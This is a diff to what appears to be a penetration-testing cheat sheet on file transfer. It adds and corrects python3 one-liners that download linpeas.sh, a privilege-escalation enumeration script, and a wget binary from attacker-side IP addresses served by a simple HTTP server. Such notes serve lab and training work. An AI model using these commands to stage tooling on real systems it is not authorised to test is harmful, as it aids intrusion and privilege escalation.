@@ -8,8 +8,14 @@ python2.7 -m SimpleHTTPServer 80
 
 
 ```bash
-python3 -c "import urllib.request; urllib.request.url//192.168.56.1:80/linpeas.sh', 'linpeas.sh')"
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://IP-ADD//linpeas.sh', 'linpeas.sh')"
 ```
+**or**
+
+```bash
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.1.36:80/linpeas.sh', 'linpeas.sh')"
+````
+
 ## python3
 ```bash
 python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.56.1//wget', 'wget')"
